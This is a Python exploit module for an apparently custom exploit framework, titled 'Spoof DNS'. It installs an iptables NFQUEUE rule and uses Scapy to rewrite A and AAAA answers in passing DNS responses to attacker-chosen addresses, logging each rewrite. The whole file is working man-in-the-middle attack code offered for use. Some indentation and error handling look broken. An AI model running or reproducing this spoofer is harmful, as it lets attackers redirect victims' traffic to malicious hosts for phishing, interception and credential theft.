from Sploit import Sploit
from collections import OrderedDict

import os
import sys
import time
import datetime
import argparse
from scapy.all import IP, UDP, NTP, DNS, DNSQR, DNSRR
from netfilterqueue import NetfilterQueue

INFO = {}
INFO['NAME'] = "Spoof DNS"
INFO['DESCRIPTION'] = "Spoof DNS packets"
INFO['VENDOR'] = "--"
INFO['CVE Name'] = "--"
INFO['NOTES'] = """
"""
INFO['DOWNLOAD_LINK'] = ""
INFO['LINKS'] = [""]
INFO['CHANGELOG'] = "1.0 14.02.20"
INFO['PATH'] = "/" #folder on website
INFO['AUTHOR'] = "dmts"

OPTIONS = OrderedDict()
OPTIONS["IPV4"] = "8.8.4.4", dict(description = 'IPv4 address to spoof')
OPTIONS["IPV6"] = "2001:4860:4860::8888", dict(description = 'IPv6 address to spoof')
#####################################################################
class exploit(Sploit):
	def __init__(self,ipv4="",ipv6="",logger=None):
		Sploit.__init__(self, logger=logger)
		self.name = INFO['NAME'] 
		self.ipv4 = ipv4
		self.ipv6 = ipv6
		self.reg_a = 1
		self.reg_aaaa = 28
	def args(self):
		self.args = Sploit.args(self, OPTIONS)
		self.ipv4 = self.args.get("IPV4", self.ipv4)
		self.ipv6 = self.args.get("IPV6", self.ipv6)

	def manipulate(self,package):
		pkt = IP(package.get_payload())
		udp = pkt.getlayer(DNSRR)
		qname =  pkt[DNSQR].qname
		type_id = pkt[DNSQR].qtype
		if (type_id == self.reg_a):
			new_ip = self.ipv4
		elif (type_id == self.reg_aaaa):
			new_ip = self.ipv6
		try:
			# Read dns name
			ip = pkt[DNS][2].rdata
			# Set new spoofed dns record
			pkt[DNS].an = DNSRR(rrname=qname, type=type_id,rdata=new_ip)
			# Set 1 record in the response
			pkt[DNS].ancount = 1
			# Delete  checksum and length
			del pkt.chksum
			del pkt.len
			del pkt[UDP].chksum
			del pkt[UDP].len
			self.log("---------------------------------")
			self.log("[*] DNS query:")
			self.log("---------------------------------")
			self.log("\tName: "+qname+" : "+ip+" -> "+new_ip)
			package.set_payload(bytes(pkt))
		except Exception as e:
			#print(e)
			pass
		#print(package)
    		package.accept()

	def run(self):
		self.args()
		self.log('Starting')
		######### MAIN CODE ###########
		# Iptables rule for DNS packets
		os.system('iptables -t raw -A PREROUTING -p udp --sport 53 -j NFQUEUE --queue-num 10')
		# Filter packets
		nfqueue = NetfilterQueue()
		# 10 is the iptabels rule queue number
		nfqueue.bind(10, self.manipulate)
		try:
			self.log("[!] Waiting for DNS packages for spoofing (IPv4 = "+self.ipv4+", IPv6 = "+self.ipv6+")")
			nfqueue.run()
		except Exception as e:
			self.log("[!] [FAIL] Failed to start NetFilterQueue : "+ e)
			sys.exit(1)
		finally:
			nfqueue.unbind()
			os.system('iptables -F -vt raw')
		###############################
        	self.finish(True)

######################################################################
if __name__ == '__main__':
    print"Running exploit %s .. " % INFO['NAME']
    e = exploit()
    e.run()

